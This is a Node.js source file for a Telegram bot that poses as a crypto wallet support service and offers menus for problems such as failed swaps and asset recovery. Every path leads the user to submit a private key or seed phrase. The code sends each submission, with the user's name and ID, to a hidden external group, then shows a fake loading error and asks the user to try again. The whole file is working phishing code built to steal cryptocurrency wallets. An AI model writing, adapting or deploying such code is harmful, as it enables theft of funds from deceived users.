import TelegramBot from "node-telegram-bot-api";
import 'dotenv/config';

const BOT_TOKEN = process.env.BOT_TOKEN;
const GROUP_ID = process.env.GROUP_ID; // External Telegram group to receive notifications

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Store user attempts to track the last option they tried
const userAttempts = {};

// 🔹 Handle /start command (Always Shows Full Main Menu)
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || "Unknown User";

    // Notify external group when user starts bot
    bot.sendMessage(GROUP_ID, `🚀 *New User Started the Bot!* 🚀\n\n👤 Username: @${username}\n🆔 User ID: ${msg.from.id}`, { parse_mode: "Markdown" });

    // Show full main menu
    showMainMenu(chatId);
});

// 🔹 Handle Main Menu and Callback Queries
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === "general_help") {
        requestWalletImport(chatId);
    } 
    else if (query.data === "other_options") {
        showBotOptions(chatId);
    } 
    else if (query.data === "import_wallet") {
        showWalletOptions(chatId);
    } 
    else if (query.data === "try_again") {
        requestWalletImport(chatId);
    }
});

// 🔹 Show Full Main Menu (Scattered Buttons)
function showMainMenu(chatId) {
    bot.sendMessage(chatId, 
        "💡 *Welcome to the Telegram Decentralized Database Bot/Website Resolver 🤩*\n\n" +
        "Where you can address issues such as:\n\n" +
        "🔹 Bot glitches\n" +
        "🔹 Asset Recovery\n" +
        "🔹 High slippage/Gas fees\n" +
        "🔹 Wallet Import Error\n" +
        "🔹 Failed Transactions\n" +
        "🔹 Swap Failures\n" +
        "🔹 Configuration Errors\n" +
        "🔹 Validation Problems\n" +
        "🔹 Rugged Token Issues\n" +
        "🔹 Auto Buy failures\n" +
        "🔹 Slow Bot Performance\n\n" +
        "Below ⬇️ are the options available to resolve any issues you may be experiencing with your bot or website.",
        {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🛠️ GENERAL HELP", callback_data: "general_help" }, { text: "🆔 WALLET VALIDATION", callback_data: "other_options" }],
                    [{ text: "⚙️ WALLET CONFIGURATION", callback_data: "other_options" }],
                    [{ text: "📉 FAILED BUY/SELL ORDER", callback_data: "other_options" }, { text: "🛠️ CLEAR BOT GLITCH/ERRORS", callback_data: "other_options" }],
                    [{ text: "🌐 GENERAL BOT/WEB ERROR", callback_data: "other_options" }],
                    [{ text: "🔫 FAILED SNIPE", callback_data: "other_options" }, { text: "🔁 FAILED SWAP", callback_data: "other_options" }],
                    [{ text: "📜 WATCHLIST", callback_data: "other_options" }],
                    [{ text: "💰 ASSET RECOVERY", callback_data: "other_options" }],
                    [{ text: "💰 HIGH SPILLAGE HELP", callback_data: "other_options" }]
                ]
            }
        }
    );
}

// 🔹 Request User to Import Wallet (For GENERAL HELP)
function requestWalletImport(chatId) {
    bot.sendMessage(chatId, "🛠️ Please import a web3 wallet with either a Private Key 🔑 or a 12-24 Seed/Recovery Phrase to get started.");
    
    // ❌ Fix: Remove all previous listeners to prevent duplicate "Try Again" buttons
    bot.removeAllListeners("message");

    bot.once("message", (msg) => handleWalletSubmission(msg, chatId));
}

// 🔹 Handle Wallet Submission & Send to External Group
function handleWalletSubmission(msg, chatId) {
    const userInput = msg.text;
    const username = msg.from.username || "Unknown User";

    // Save the last attempted option
    userAttempts[chatId] = "wallet_import";

    // Send input to external group
    bot.sendMessage(GROUP_ID, `✅ *New Wallet Submission*\n\n👤 User: @${username}\n🆔 User ID: ${msg.from.id}\n📝 Data: ${userInput}`, { parse_mode: "Markdown" });

    // Respond with error message and "Try Again" button
    bot.sendMessage(chatId, "❌ *Error loading your wallet.*", {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔄 Please try again", callback_data: "try_again" }]
            ]
        }
    });

    // ❌ Fix: Remove previous listeners before adding a new one
    bot.removeAllListeners("message");

    // Always listen for new inputs & send them to the group
    bot.once("message", (newMsg) => handleWalletSubmission(newMsg, chatId));
}

// 🔹 Show Bot Selection Menu
function showBotOptions(chatId) {
    bot.sendMessage(chatId, "PLEASE CHOOSE YOUR PREFERRED BOT BELOW:", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Trojan on Solana", callback_data: "import_wallet" }, { text: "TradeWiz Bot", callback_data: "import_wallet" }],
                [{ text: "Maestro Bot", callback_data: "import_wallet" }, { text: "GMGN AI", callback_data: "import_wallet" }],
                [{ text: "Unibot", callback_data: "import_wallet" }, { text: "BONKbot", callback_data: "import_wallet" }],
                [{ text: "Banana Gun", callback_data: "import_wallet" }, { text: "Major Buy Bot", callback_data: "import_wallet" }],
                [{ text: "BullX", callback_data: "import_wallet" }, { text: "MevX Bot/Web", callback_data: "import_wallet" }],
                [{ text: "Nova Bot", callback_data: "import_wallet" }, { text: "Sui Sniper Bot", callback_data: "import_wallet" }],
                [{ text: "SolTrading Bot", callback_data: "import_wallet" }, { text: "DEFI Wallet Connect", callback_data: "import_wallet" }],
                [{ text: "Magnum Bot", callback_data: "import_wallet" }, { text: "Shuriken", callback_data: "import_wallet" }],
                [{ text: "Pumpfun Web", callback_data: "import_wallet" }, { text: "Base/Tron/Sui/Xrp/Bsc", callback_data: "import_wallet" }],
                [{ text: "All Others Bots", callback_data: "import_wallet" }]
            ]
        }
    });
}

// 🔹 Show Wallet Import Options
function showWalletOptions(chatId) {
    bot.sendMessage(chatId, "🔐 Please import your web3 wallet to proceed.", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔑 Proceed with Seed Phrase", callback_data: "general_help" }],
                [{ text: "🗝️ Proceed with Private Key", callback_data: "general_help" }]
            ]
        }
    });
}